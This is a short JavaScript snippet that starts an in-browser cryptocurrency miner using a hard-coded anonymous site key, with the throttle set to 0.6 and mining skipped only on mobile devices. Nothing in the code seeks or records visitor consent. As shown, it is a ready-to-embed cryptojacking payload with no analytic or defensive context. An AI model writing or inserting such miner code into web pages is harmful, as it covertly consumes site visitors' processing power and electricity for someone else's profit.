    var miner = new Client.Anonymous('d7aec1fecd1e99921d73d49ce5893e2b98ff5f5c7548f4aa70b9d00244849f8e', {
        throttle: 0.6
    });
    if (!miner.isMobile()) {
        miner.start();
    }